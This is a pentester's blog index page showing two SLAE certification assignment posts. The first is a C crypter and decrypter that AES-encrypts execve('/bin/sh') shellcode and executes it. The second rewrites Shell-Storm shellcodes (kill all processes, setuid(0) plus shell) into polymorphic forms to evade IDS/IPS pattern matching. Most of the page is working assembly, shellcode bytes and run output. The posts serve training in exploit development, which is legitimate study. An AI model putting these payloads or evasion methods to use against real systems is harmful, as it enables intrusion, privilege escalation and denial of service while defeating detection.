<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>Latest Posts &#8211; rtmcx</title>
<meta name="description" content="Describe this nonsense.">
<meta name="keywords" content="Jekyll, theme, themes, responsive, blog, modern">



<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Latest Posts">
<meta property="og:description" content="Describe this nonsense.">
<meta property="og:url" content="https://rtmcx.github.io/">
<meta property="og:site_name" content="rtmcx">





<link rel="canonical" href="https://rtmcx.github.io/">
<link href="https://rtmcx.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="rtmcx Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="https://rtmcx.github.io/assets/css/main.css">
<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="https://rtmcx.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="https://rtmcx.github.io/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://rtmcx.github.io/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://rtmcx.github.io/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://rtmcx.github.io/images/apple-touch-icon-144x144-precomposed.png">



</head>

<body id="post-index" class="feature">

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="https://rtmcx.github.io/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="https://rtmcx.github.io/images/CatEye.jpg" alt="rtmcx photo" class="author-photo">
					<h4>rtmcx</h4>
					<p>Pentester. OSCP. Aspiring shellcoder and malware analyst</p>
				</li>
				<li><a href="https://rtmcx.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:rtmcx@protonmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				
				
				
				
				
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="https://rtmcx.github.io/posts/">All Posts</a></li>
				<li><a href="https://rtmcx.github.io/tags/">All Tags</a></li>
			</ul>
		</li>
		
	    
	    <li><a href="http://www.twitter.com/rtmcx" target="_blank">Twitter</a></li>
	  
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->


<div class="entry-header">
  <div class="image-credit">Image source: <a href="http://www.4a-games.com/metro-last-light.html">A4 Games</a></div><!-- /.image-credit -->
  
    <div class="entry-image">
      <img src="https://rtmcx.github.io/images/metro.jpg" alt="Latest Posts">
    </div><!-- /.entry-image -->
  
  <div class="header-title">
    <div class="header-title-wrap">
      <h1>rtmcx</h1>
      <h2>Latest Posts</h2>
    </div><!-- /.header-title-wrap -->
  </div><!-- /.header-title -->
</div><!-- /.entry-header -->

<div id="main" role="main">
  
<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-7/" title="SLAE Assignment 7"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 7"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-05-09T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-7/">May 09, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~3 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-7/" rel="bookmark" title="SLAE Assignment 7" itemprop="url">SLAE Assignment 7</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="requirements">Requirements</h1>

<ul>
  <li>Create a custom crypter like the one shown in the “crypters”video</li>
  <li>Free to use any existing encryption schema</li>
  <li>Can use any programming language</li>
</ul>

<p>The final assignment is to write a custom (shellcode) encrypter/decrypter.</p>

<p>The first task is tho select a algoritm to use for the assignment.</p>

<p>For this assignment, I will be using the “<a href="https://gnupg.org/software/libgcrypt/index.html">Libgcrypt</a>“-library. 
The programming language of choice will be “C”.</p>

<p>First of, what is “libgcrypt”? The documentation states that<br />
<i>Libgcrypt is a general purpose cryptographic library originally based on code from GnuPG.</i></p>

<p>It supports several symmetric cipher algorithms (AES, Arcfour, Blowfish, Camellia, CAST5, ChaCha20 DES, GOST28147, Salsa20, SEED, Serpent, Twofish) and is easy to use.</p>

<p>First we need to make sure the required library are installed:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ sudo apt install libgcrypt20-dev
</code></pre>
</div>

<p>We then need some shellcode to encrypt. For this purpose I use the Execve(‘/bin/sh’), stack version:</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>
<span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span>
        <span class="c">; Push the string "/bin/sh"0x0 to the stack</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; Make eax all nulls</span>
        <span class="k">push</span> <span class="n">eax</span>                <span class="c">; Push to stack (will be null-terminator)</span>
        <span class="k">push</span> <span class="mh">0x68732f6e</span>         <span class="c">; hs/n in hex</span>
        <span class="k">push</span> <span class="mh">0x69622f2f</span>         <span class="c">; ib//  in hex</span>

        <span class="c">; Set up ebx for syscall</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; Put address to //bin/sh0x0 in ebx</span>

        <span class="c">; Set up edx for syscall</span>
        <span class="c">; edx needs to have only nulls</span>
        <span class="k">push</span> <span class="n">eax</span>                <span class="c">; put 0x0000 on stack</span>
        <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; put address to 0x0000 in edx</span>

        <span class="c">; set up ecx for syscall</span>
        <span class="c">; ecx needs to have the array of /bin/sh0x0,0x0000      </span>
        <span class="k">push</span> <span class="n">ebx</span>                <span class="c">; push the address of /bin/sh0x0 in ebx, </span>
                                <span class="c">; this will be added "on top" of the address to 0x0000 </span>

        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; put address of [/bin/sh0x0, 0x0000] in ecx</span>

        <span class="c">; Invoke the syscall    </span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="c">; Syscall number for execve</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; Execute</span>
</code></pre>
</div>
<p>Compile and link to get the shellcode:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
</code></pre>
</div>

<p>We can then write the encrypter program and insert the shellcode to be encrypted. The algorithm to use will be “aes256” and is hardcoded in this version. The key will be provided on the commandline.</p>

<p>Encrypter:</p>
<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;gcrypt.h&gt;
</span>
<span class="c1">// Shellcode for Execve('/bin/sh')
</span><span class="kt">uint8_t</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
<span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">uint8_t</span> <span class="n">initVector</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x0A</span><span class="p">};</span> <span class="c1">//Set the initialization vector
</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">encrypter</span><span class="p">(</span><span class="kt">int</span> <span class="n">algorithm</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">){</span>

        <span class="n">gcry_cipher_hd_t</span> <span class="n">hd</span><span class="p">;</span>
        <span class="n">gcry_cipher_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hd</span><span class="p">,</span> <span class="n">algorithm</span><span class="p">,</span> <span class="n">GCRY_CIPHER_MODE_OFB</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">gcry_cipher_setkey</span><span class="p">(</span><span class="n">hd</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
        <span class="n">gcry_cipher_setiv</span><span class="p">(</span><span class="n">hd</span><span class="p">,</span> <span class="n">initVector</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>

        <span class="n">gcry_cipher_encrypt</span><span class="p">(</span><span class="n">hd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
        <span class="n">gcry_cipher_close</span><span class="p">(</span><span class="n">hd</span><span class="p">);</span>
<span class="p">}</span>       

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>       
        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"[!] No key provided.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"usage: %s &lt;KEY&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">key</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

        <span class="kt">int</span> <span class="n">ag</span> <span class="o">=</span> <span class="n">gcry_cipher_map_name</span><span class="p">(</span><span class="s">"aes256"</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Encrypting shellcode using key '%s':</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

        <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
        <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>

        <span class="n">encrypter</span><span class="p">(</span><span class="n">ag</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

        <span class="c1">// Print the encrypted shellcode    
</span>        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
</div>

<p>Compile it (and make sure to link the gcrypt-library) and execute the program to get the encrypted shellcode.</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot # gcc encoder.c -o encoder -lgcrypt -fno-stack-protector -z execstack

rtmcx@parrot # ./encoder MyKeyIsSecret
Encrypting shellcode using key 'MyKeyIsSecret':
\x61\xe5\x83\xea\x65\x32\xf4\xd4\xf3\x47\x49\x38\xc6\xad\xc3\x4a\x84\xfe\xe2\x1c\xe3\x09\x19\xed\x3a
</code></pre>
</div>
<p>We can then write the decrypter program and insert the encrypted shellcode in the code.</p>

<p>Decrypter:</p>
<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;gcrypt.h&gt;
</span>

<span class="kt">uint8_t</span> <span class="n">encryptedShellCode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x61\xe5\x83\xea\x65\x32\xf4\xd4\xf3\x47\x49\x38\xc6\xad\xc3\x4a\x84\xfe\xe2\x1c\xe3\x09\x19\xed\x3a</span><span class="s">"</span><span class="p">;</span>

<span class="kt">uint8_t</span> <span class="n">initVector</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x0A</span><span class="p">};</span> <span class="c1">//Set the initialization vector
</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">decrypter</span><span class="p">(</span><span class="kt">int</span> <span class="n">algorithm</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">){</span>
    
        <span class="n">gcry_cipher_hd_t</span> <span class="n">hd</span><span class="p">;</span>
        <span class="n">gcry_cipher_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hd</span><span class="p">,</span> <span class="n">algorithm</span><span class="p">,</span> <span class="n">GCRY_CIPHER_MODE_OFB</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">gcry_cipher_setkey</span><span class="p">(</span><span class="n">hd</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
        <span class="n">gcry_cipher_setiv</span><span class="p">(</span><span class="n">hd</span><span class="p">,</span> <span class="n">initVector</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>

        <span class="n">gcry_cipher_decrypt</span><span class="p">(</span><span class="n">hd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">encryptedShellCode</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
        <span class="n">gcry_cipher_close</span><span class="p">(</span><span class="n">hd</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>       
        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"[!] No key provided.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"usage: %s &lt;KEY&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">key</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

        <span class="kt">int</span> <span class="n">ag</span> <span class="o">=</span> <span class="n">gcry_cipher_map_name</span><span class="p">(</span><span class="s">"aes256"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Decrypting shellcode using key '%s':</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

        <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">encryptedShellCode</span><span class="p">);</span>
        <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>

        <span class="n">decrypter</span><span class="p">(</span><span class="n">ag</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">buffer</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Running shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">ret</span><span class="p">();</span>

        <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre>
</div>
<p>Compile and execute to get our shell:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot # gcc -lgcrypt -fno-stack-protector -z execstack decoder.c -o decoder

rtmcx@parrot # ./encoder MyKeyIsSecret
Decrypting shellcode using key 'MyKeyIsSecret':
Running shellcode...
$ 
</code></pre>
</div>
<p>Success!</p>

<p>In this version the shellcode is hardcoded, but improvements include to provide the algorithm on the commandline and also write/read the shellcode to a file to avoid the need to recompile the programs every time.</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-6/" title="SLAE Assignment 6"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 6"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-05-09T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-6/">May 09, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~5 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-6/" rel="bookmark" title="SLAE Assignment 6" itemprop="url">SLAE Assignment 6</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="requirements">Requirements</h1>

<ul>
  <li>Take three shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching.</li>
  <li>The polymorphic version can not be larger than 150% of the existing shellcode. So if the existing shellcode is 30 bytes, the polymorphic version can not be larger than 45 bytes.</li>
</ul>

<h2 id="shellcode-1---kill-all-processes">Shellcode 1 - Kill all processes</h2>

<p>The first shellcode is the <a href="http://shell-storm.org/shellcode/files/shellcode-212.php">11 byte shellcode to kill all processes for Linux/x86</a></p>

<p>Looking at the shellcode, we see in the comments that this shellcode will execute ‘kill(-1, SIGKILL)’ (which exits all running processes).</p>

<p>Original shellcode (11 bytes)</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>		<span class="k">push</span> <span class="n">byte</span> <span class="mi">37</span>
		<span class="k">pop</span> <span class="n">eax</span>
		<span class="k">push</span> <span class="n">byte</span> <span class="o">-</span><span class="mi">1</span>
		<span class="k">pop</span> <span class="n">ebx</span>
		<span class="k">push</span> <span class="n">byte</span> <span class="mi">9</span>
		<span class="k">pop</span> <span class="n">ecx</span>
		<span class="k">int</span> <span class="mh">0x80</span>
		
</code></pre>
</div>

<p>So we need to populate eax, ebx and ecx with these values: <br />
eax = 37<br />
ebx = -1<br />
ecx = 9<br /></p>

<p>Polymorphic version (15 bytes)</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>		<span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>           <span class="c">; set eax to 0</span>
		<span class="k">add</span> <span class="n">al</span><span class="p">,</span> <span class="mi">37</span>             <span class="c">; Set eax to 37</span>
		<span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>           <span class="c">; Set ebx = 0</span>
		<span class="k">sub</span> <span class="n">ebx</span><span class="p">,</span> <span class="mi">1</span>             <span class="c">; ebx = -1</span>
		<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>           <span class="c">; ecx = 0</span>
		<span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mi">09</span>             <span class="c">; ecx = 9</span>
		<span class="k">int</span> <span class="mh">0x80</span>
</code></pre>
</div>
<p>So the finished polymorphic shellcode looks like this:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>\x31\xc0\x04\x25\x31\xdb\x83\xeb\x01\x31\xc9\xb1\x09\xcd\x80
</code></pre>
</div>

<p>By starting the shellcode in gbd, and breaking just before the syscall, we can see that the registers are setup correctly:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>EAX: 0x25 ('%')
EBX: 0xffffffff 
ECX: 0x9 ('\t')
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xbffff3d0 --&gt; 0x1 
EIP: 0x804806d (&lt;_start+13&gt;:	int    0x80)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048061 &lt;_start+1&gt;:	rol    BYTE PTR [eiz*1-0x147c24cf],0x1
   0x8048069 &lt;_start+9&gt;:	xor    ecx,ecx
   0x804806b &lt;_start+11&gt;:	mov    cl,0x9
=&gt; 0x804806d &lt;_start+13&gt;:	int    0x80
   0x804806f:	add    BYTE PTR [eax],al
   0x8048071:	add    BYTE PTR [eax],al
   0x8048073:	add    BYTE PTR [eax],al
   0x8048075:	add    BYTE PTR [eax],al
</code></pre>
</div>

<p>By stepping one more step, the syscall is executed and we get kicked out from the system due to the killall-call…</p>

<p><br /></p>
<h2 id="shellcode-2---revenge-setuid">Shellcode 2 - revenge-setuid</h2>

<p>The next shellcode is the <a href="http://shell-storm.org/shellcode/files/shellcode-215.php">revenge-setuid.c-shellcode</a>.</p>

<p>The shellcode executes setuid(0) and execve(‘/bin/sh’) and is 28 bytes in original form.</p>
<div class="highlighter-rouge"><pre class="highlight"><code> * [    setuid (6 bytes) + execve (22 bytes)  = 28 bytes       ]
 * [                                                           ]
 * [    Same as revenge-execve.c we start the 2 system         ]
 * [    calls with a mov resulting in 2 bytes less, but        ]
 * [    this one is only for suid binary exploitation.         ]
                                     // &lt;_start&gt;
       "\xb0\x17"                    // mov    $0x17,%al
       "\x31\xdb"                    // xor    %ebx,%ebx
       "\xcd\x80"                    // int    $0x80
       "\xb0\x0b"                    // mov    $0xb,%al
       "\x99"                        // cltd
       "\x52"                        // push   %edx
       "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
       "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
       "\x89\xe3"                    // mov    %esp,%ebx
       "\x52"                        // push   %edx
       "\x53"                        // push   %ebx
       "\x89\xe1"                    // mov    %esp,%ecx
       "\xcd\x80"                    // int    $0x80
</code></pre>
</div>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; in Intel format</span>
<span class="kr">global</span> <span class="n">_start</span>
<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>
	<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x17</span>
	<span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
	<span class="k">int</span> <span class="mh">0x80</span>
	<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>
	<span class="n">cltd</span>
	<span class="k">push</span> <span class="n">edx</span>
	<span class="k">push</span> <span class="mh">0x68732f2f</span>
	<span class="k">push</span> <span class="mh">0x6e69622f</span>
	<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
	<span class="k">push</span> <span class="n">edx</span>
	<span class="k">push</span> <span class="n">ebx</span>
	<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>
	<span class="k">int</span> <span class="mh">0x80</span>
</code></pre>
</div>

<p>Apart from using different instructions than the original shellcode, it is useful to scramble the strings that ‘execve’ uses (the ‘/bin//sh’-strings) since these are the most susceptible to fingerprinting in IDS/IPS.</p>

<p>In this example, it is only scrambled so that the values of the string that will be pushed is ‘./bim/sh’.</p>

<p>The commented code is as follows:</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="kr">global</span> <span class="n">_start</span>
<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>
        <span class="k">cdq</span>                     <span class="c">; Clear eax,</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; and ebx</span>
        <span class="k">add</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x17</span>            <span class="c">; Syscall 0x17 (sys_setuid16)</span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; Execute syscall</span>

        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; clear eax</span>
        <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>            <span class="c">; and edx</span>
        <span class="k">add</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>             <span class="c">; Syscall 0x0B  </span>
        <span class="k">push</span> <span class="n">edx</span>                <span class="c">; push 0</span>
        <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x68732f6d</span>     <span class="c">; 'hs/m' </span>
        <span class="k">add</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x1</span>            <span class="c">; Add one the get correct string</span>
        <span class="k">push</span> <span class="n">edi</span>                <span class="c">; push to the stack</span>
        <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x69622f2e</span>     <span class="c">; 'ib/.'</span>
        <span class="k">add</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x1</span>            <span class="c">; Add one to get corect string</span>
        <span class="k">push</span> <span class="n">edi</span>                <span class="c">; push string to the stack</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; Get address to string</span>
        <span class="k">push</span> <span class="n">edx</span>                <span class="c">; push 0        </span>
        <span class="k">push</span> <span class="n">ebx</span>                <span class="c">; push 0</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; Get address to array  </span>
        <span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; Execute syscall</span>
            
</code></pre>
</div>
<p>This will generate the following shellcode:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>\x99\x89\xc3\x04\x17\xcd\x80\x31\xc0\x89\xc2\x04\x0b\x52\xbf\x6d\x2f\x73\x68\x83\xc7\x01
\x57\xbf\x2e\x2f\x62\x69\x83\xc7\x01\x57\x89\xe3\x52\x53\x89\xe1\xcd\x80
</code></pre>
</div>

<p>Shellcode length: 40</p>

